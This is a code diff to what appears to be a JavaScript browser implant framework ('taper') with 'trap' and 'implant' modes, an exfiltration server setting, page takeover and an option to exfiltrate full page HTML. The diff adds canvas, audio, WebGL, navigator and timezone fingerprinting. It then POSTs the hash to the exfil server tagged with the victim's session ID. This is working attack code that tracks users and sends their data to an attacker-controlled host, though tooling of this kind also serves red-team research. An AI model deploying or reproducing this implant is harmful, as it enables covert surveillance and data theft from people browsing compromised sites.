@@ -52,8 +52,7 @@ function initGlobals()
 	window.taperMode = "trap";
 
 	// Exfil server
-	//window.taperexfilServer = "https://127.0.0.1:8444";
-	window.taperexfilServer = "https://100.115.92.203:8444";
+	window.taperexfilServer = "https://127.0.0.1:8444";
 
 
 	// Below settings only matter if you're in trap mode
@@ -79,9 +78,8 @@ function initGlobals()
 		// load the page the user was on in the iframe
 		// when they reloaded the page. Otherwise,
 		// they'll start here
-		//window.taperstartingPage = "https://targetapp.possiblymalware.com/wp-admin";
-		//window.taperstartingPage = "https://127.0.0.1:8443/";
-		window.taperstartingPage = "http://127.0.0.1:5000";
+		window.taperstartingPage = "https://127.0.0.1:8443/";
+		//window.taperstartingPage = "http://127.0.0.1:5000";
 	}
 	else // if implant mode
 	{
@@ -107,6 +105,10 @@ function initGlobals()
 
 	// Should we set an optional client tag?
 	window.taperTag = "testTag";
+
+
+	// Should we fingerprint clients?
+	window.taperFingerprint = true;
 
 	// Should we exfil the entire HTML code?
 	window.taperexfilHTML = true;
@@ -174,6 +176,130 @@ function initGlobals()
 		sessionStorage.setItem('taperSessionStorage', '');
 	}
 }
+
+
+
+// Optional fingerprinting methods
+function fnv1aHash(str) 
+{
+    let hash = 0x811c9dc5;
+    for (let i = 0; i < str.length; i++) 
+    {
+        hash ^= str.charCodeAt(i);
+        hash = (hash + (hash << 1) + (hash << 4) + (hash << 7) + (hash << 8) + (hash << 24)) >>> 0;
+    }
+    return hash;
+}
+
+function toBase64URL(number) 
+{
+    const base64 = btoa(String.fromCharCode(...new Uint8Array(new Uint32Array([number]).buffer)));
+    return base64.replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
+}
+
+async function getFingerprintHash() 
+{
+    const fingerprint = await getFingerprint();
+    const fingerprintString = JSON.stringify(fingerprint);
+    const hashValue = fnv1aHash(fingerprintString);
+    const base64UrlHash = toBase64URL(hashValue);
+    return base64UrlHash;
+}
+
+// Example usage with other fingerprinting functions
+function getCanvasFingerprint() 
+{
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
+    ctx.textBaseline = 'top';
+    ctx.font = '14px Arial';
+    ctx.textBaseline = 'alphabetic';
+    ctx.fillStyle = '#f60';
+    ctx.fillRect(125, 1, 62, 20);
+    ctx.fillStyle = '#069';
+    ctx.fillText('Test', 2, 15);
+    ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+    ctx.fillText('Test', 4, 17);
+    return canvas.toDataURL();
+}
+
+function getAudioFingerprint() 
+{
+    return new Promise(resolve => {
+        const context = new (window.AudioContext || window.webkitAudioContext)();
+        const oscillator = context.createOscillator();
+        const analyser = context.createAnalyser();
+        const gain = context.createGain();
+        const scriptProcessor = context.createScriptProcessor(4096, 1, 1);
+
+        oscillator.type = 'triangle';
+        oscillator.frequency.setValueAtTime(10000, context.currentTime);
+        gain.gain.setValueAtTime(0, context.currentTime);
+
+        oscillator.connect(analyser);
+        analyser.connect(scriptProcessor);
+        scriptProcessor.connect(context.destination);
+
+        scriptProcessor.onaudioprocess = event => {
+            const fingerprint = event.inputBuffer.getChannelData(0).slice(0, 50);
+            resolve(fingerprint.toString());
+            oscillator.disconnect();
+            scriptProcessor.disconnect();
+        };
+
+        oscillator.start(0);
+    });
+}
+
+function getNavigatorFingerprint() 
+{
+    return {
+        userAgent: navigator.userAgent,
+        language: navigator.language,
+        languages: navigator.languages,
+        platform: navigator.platform,
+        hardwareConcurrency: navigator.hardwareConcurrency,
+        deviceMemory: navigator.deviceMemory,
+        screenResolution: [screen.width, screen.height],
+        colorDepth: screen.colorDepth
+    };
+}
+
+function getWebGLFingerprint() 
+{
+    const canvas = document.createElement('canvas');
+    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+    return {
+        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+    };
+}
+
+function getTimeZoneFingerprint() 
+{
+    return Intl.DateTimeFormat().resolvedOptions().timeZone;
+}
+
+async function getFingerprint() 
+{
+    const canvasFingerprint = getCanvasFingerprint();
+    const audioFingerprint = await getAudioFingerprint();
+    const navigatorFingerprint = getNavigatorFingerprint();
+    const webGLFingerprint = getWebGLFingerprint();
+    const timeZoneFingerprint = getTimeZoneFingerprint();
+
+    return {
+        canvas: canvasFingerprint,
+        audio: audioFingerprint,
+        navigator: navigatorFingerprint,
+        webGL: webGLFingerprint,
+        timeZone: timeZoneFingerprint
+    };
+}
+
+
+
 
 
 
@@ -1256,6 +1382,19 @@ if (sessionStorage.getItem('taperSystemLoaded') != "true")
 
     				// We're ready to trap all the things now
 					takeOver();
+
+					getFingerprintHash().then(hash => {
+					    console.log('Hash:', hash);
+					    request = new window.taperXHR();
+					    request.noIntercept = true;
+					    request.open("POST", taperexfilServer + "/client/fingerprint/" +
+					    	sessionStorage.getItem('taperSessionUUID'));
+						request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+						var jsonObj = new Object();
+						jsonObj["fingerprint"] = hash;
+						var jsonString = JSON.stringify(jsonObj);
+						request.send(jsonString);
+					});
 				}
 				// else
 				// {
